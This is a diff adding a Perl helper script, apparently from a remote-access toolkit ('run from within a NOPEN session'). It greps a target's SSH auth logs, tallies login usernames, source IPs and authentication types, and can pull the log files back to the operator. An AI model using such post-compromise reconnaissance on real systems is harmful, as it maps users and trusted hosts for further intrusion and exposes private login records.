@@ -1,0 +1,295 @@
+#!/usr/bin/env perl
+##
+$VER="1.0.0.3" ;
+$| = 1 ;
+my @filelist = (
+  "/var/adm/secure",
+  "/var/log/secure",
+  "/var/adm/authlog",
+  "/var/log/authlog",
+);
+
+my @existlist = ();
+
+my %ipcount = ();
+my %usercount = ();
+my %winportcount = ();
+my %unixportcount = ();
+my %ipportmap = ();
+
+my $usedpassword = 0;
+my $usedkey = 0;
+
+my $count = 0;
+
+my $extendedstats = 0;
+my $getfiles = 0;
+my $savestats = 0;
+my $savestatssilent = 0;
+myinit() ;
+
+# This is where our stats are saved.
+my $statsfile = "sshcheck.$nopen_rhostname";
+
+# do the files exist?
+foreach $filename (@filelist) {
+  my ($output,$nopenlines,@output) = nopenlss("-rZ","$filename*");
+  processnopenls(\@existlist,0,0,0,$output,$nopenlines,@output);
+#  ($output,$nopenlines,@output) = doit("-ls -t $filename*");
+#  #dbg("in sshcheck, looking for =$filename= in =@output=");
+#  foreach my $line (@output) {
+#    #dbg("in sshcheck, got line =$line=");
+#    next unless $line =~ /^.*\s+(\d+)\s\D.*\s($filename(\.\d)?)/;
+#    dbg("in sshcheck, found filename =$2= of size =$1=");
+#    push(@existlist,"$2") if $1 > 0;
+#  }
+}
+
+if (! @existlist) {
+  mydie("No non-zero-length files were found on target in the search list");
+}
+
+# Do we want the files?
+nopenlss("-rUFGQ","-T50","@existlist") if ($getfiles);
+
+my $sshcheckfile = "$opdown/egrep.sshcheck.$nopen_rhostname";
+preservefile($sshcheckfile);
+
+# Check for overlong command lines.
+
+my $cmd = "egrep .*sshd.*Accepted.*ssh* ";
+my @whittlelist = @existlist;
+my $arglist = "";
+while(@whittlelist) {
+  my $next = shift @whittlelist;
+  if ($arglist and length "$cmd $arglist $next" >= 2000) {
+    doit("$cmd $arglist >>L:$sshcheckfile");
+    $arglist = "";
+  }
+  $arglist .= " $next";
+}
+doit("$cmd $arglist >>L:$sshcheckfile");
+
+# Pull back the raw lines from the files.
+mydie ("No output returned from egrep") if (-z $sshcheckfile);
+
+open(EGREPOUT, "< $sshcheckfile") or mydie("Can't open egrep output! $!");
+my $totallines = 0;
+foreach $line (<EGREPOUT>) {
+  next if $line =~ /^egrep:.*/;
+  $totallines++;
+  my ($null,$username,$ip,$port,$protocol) = 
+    $line =~ /\sfor\s(ROOT USER)?\s?(\S+)\sfrom\s(::f{4}:\d+\.\d+\.\d+\.\d+|\d+\.\d+\.\d+\.\d)\sport\s(\d+)\s(\S+)$/;
+  # We're not interested in IPv6 right now, so clean that up...
+  $ip =~ s/::f{4}://;
+  $ipcount{$ip}++;
+  $usercount{$username}++;
+  $winportcount{$port}++ if ($port > 1024 and $port < 10000);
+  $unixportcount{$port}++ if ($port > 30000 and $port < 65535);
+  $usedpassword++ if $line =~ /^.*Accepted (password|keyboard-interactive) /;
+  $usedkey++ if $line =~ /^.*Accepted.*key /;
+  
+  # Map the port number to the IP in the hash array.
+  push @{ $ipportmap{$ip} }, $port;
+}
+close(EGREPOUT);
+my $totalips = keys %ipcount;
+my $totalusernames = keys %usercount;
+
+$listing =
+  ".\n\n\n".
+  "The following files were searched for SSH-related lines:\n\t".
+  "";
+$count = 0;
+foreach (@existlist) {
+  $listing .= "\n\t" if $count == 3;
+  $count = 0 if $count == 3;
+  $listing .= "$_ ";
+  $count++;
+}
+$listing .=
+  "\n\n".
+  "Total number of SSH-related lines in above files: $totallines\n\n".
+  "Total unique usernames found in log files: $totalusernames\n". 
+  "Unique usernames found in logfiles:\n\t".
+  "";
+$count = 0;
+foreach (sort keys %usercount) {
+  $listing .= "\n\t" if $count == 10;
+  $count = 0 if $count == 4;
+  $listing .= "$_ ";
+  $count++;
+}
+$listing .=
+  "\n\n".
+  "Number of times a password login was used: $usedpassword\n".
+  "Number of times a public/private key login was used: $usedkey\n\n".
+  "Total unique IPs found in log files: $totalips\n".
+  "Unique IPs found in logfiles:\n\t".
+  "";
+$count = 0;
+foreach (sort keys %ipcount) {
+  $listing .= "\n\t" if $count == 4;
+  $count = 0 if $count == 4;
+  $listing .= "$_ ";
+  $count++;
+}
+$listing .=
+  "\n\n".
+  "Best-guess OS touch for unique IPs:".
+  "";
+foreach (sort keys %ipportmap) {
+  my $iswindows = 0;
+  my $isunix = 0;
+  $listing .= "\n\t$_: ";
+  foreach $port (@{ $ipportmap{$_} }) {
+    $iswindows++ if ($port > 1024 and $port < 10000);
+    $isunix++ if ($port > 30000 and $port < 65535);
+  }
+  $listing .= "Windows" if ($iswindows and !$isunix);
+  $listing .= "UNIX" if ($isunix and !$iswindows);
+  $listing .= "Unknown" if (($iswindows and $isunix) or (!$iswindows and !$isunix));
+}
+  
+if ($extendedstats) {
+  my $totalwinports = keys %winportcount;
+  my $totalunixports = keys %unixportcount;
+  my $totalports = $totalwinports + $totalunixports;
+  
+  $listing .=
+    "\n\n".
+    "Total source ports found in log files: $totalports\n".
+    "";
+  $listing .=
+    "\n".
+    "Windows source ports used:\n\t".
+    "" if $totalwinports;
+  $count = 0;
+  foreach (sort by_num keys %winportcount) {
+    $listing .= "\n\t" if $count == 10;
+    $count = 0 if $count == 10;
+    $listing .= "$_ ";
+    $count++;
+  }
+  
+  $listing .= 
+    "\n\n".
+    "UNIX source ports used:\n\t".
+    "" if $totalunixports;
+  $count = 0;
+  foreach (sort by_num keys %unixportcount) {
+    $listing .= "\n\t" if $count == 10;
+    $count = 0 if $count == 10;
+    $listing .= "$_ ";
+    $count++;
+  }
+}
+  
+# Print our statistics.
+if ($savestats or $savestatssilent) {
+  open(STATSFILE, "> $opdown/$statsfile") or mydie("Can't open statistics file! $!");
+  select STATSFILE;
+  print "$listing";
+  close STATSFILE;
+  select STDOUT;
+  
+  $listing .=
+    "\n\n\n".
+    "${COLOR_FAILURE}Statistics saved to $opdown/$statsfile${COLOR_NORMAL}".
+    "" unless $savestatssilent;
+}
+progprint("${COLOR_NORMAL}$listing") unless $savestatssilent;
+
+# End with true value as we may someday require this script elsewhere.
+1;
+#ENDMAIN
+
+sub myinit {
+  # If $willautoport is already defined, we must have been called
+  # by another script via require. We do not re-do autoport stuff.
+  # $calleddirect is set if alert
+  $calledviarequire = 0;
+  if ($willautoport and $socket) {
+    progprint("$prog called -gs sshcheck @ARGV");
+    $calledviarequire = 1;
+  } else {
+    $willautoport=1;
+    my $autoutils = "../etc/autoutils" ;
+    unless (-e $autoutils) {
+      $autoutils = "/current/etc/autoutils" ;
+    }
+    require $autoutils;
+    $prog = "-gs sshcheck" ;
+    $vertext = "$prog version $VER\n" ;
+    mydie("No user servicable parts inside.\n".
+	  "(I.e., noclient calls $prog, not you.)\n".
+	  "$vertext") unless $nopen_rhostname;
+  }
+  clearallopts();
+  
+  # Are there any filenames on the command line?
+  foreach (@ARGV) {
+    next unless /(\/.*)$/;
+    push(@filelist,$1);
+  }
+  
+  mydie("bad option(s)") if (! Getopts( "hesSgv" ) ) ;
+  $usagetext="
+Usage: $prog [-h]                       (prints this usage statement)
+
+NOT CALLED DIRECTLY
+
+$prog is run from within a NOPEN session via when \"$prog\" is used.
+
+";
+  $gsusagetext="Usage: $prog [OPTIONS] [FILES]
+
+$prog parses various log files looking for SSH connections, using the
+regular expression \".*sshd.*Accepted.*ssh*\". When it locates one of the log
+files, it uses egrep on target to find all of the lines indicating incoming
+SSH connections, pulls out their IPs and the type of login performed, and
+prints some statistics about the connections it found.
+
+By default, the statistics printed include the list of files searched, the
+total number of lines found in the files searched, the username used for the
+login, a breakdown of the types of authentication (password-based or
+publickey-based), a count of the unique IPs found in the lines returned by
+egrep, and a list of the IPs themselves.
+
+When the -e switch is used, additional statistics are shown; these include
+the total number of unique source ports and a breakdown of best guesses about
+the OS of the client machines using those ports. When the -f switch is used,
+the statistics are also saved to a statistics file in /current/down.
+
+The base filenames that $prog searches for on target are:
+  @filelist
+  
+To specify additional files, include the fully-qualified path to the file(s)
+on target at the end of the command line; $prog will add the file to
+the search list and check for its existence using a wildcarded -ls command.
+If found, it will be passed to egrep.
+ 
+  OPTIONS
+
+  -h       show this usage statement
+  -v       show version number
+  -e       print extended statistics
+  -s       save the statistics to a file
+  -S       save the statistics silently (don't print them on screen)
+  -g       offer to pull the log files that were found
+
+";
+  usage() if ($opt_h or $opt_v) ;
+  $extendedstats = $opt_e;
+  $getfiles = $opt_g;
+  $savestats = $opt_s;
+  $savestatssilent = $opt_S;
+  $socket = pilotstart(quiet) unless $socket;
+  
+  # Bail if egrep doesn't exist.
+  #my ($output,$nopenlines,@output) = nopenlss("-UQP","egrep");
+  ($output,$nopenlines,@output) = doit("-ls /bin/egrep /usr/bin/egrep /sbin/egrep /usr/sbin/egrep");
+  unless ($output =~ m,/egrep,) {
+    mydie("egrep not found on this target!");
+  }
+} #myinit
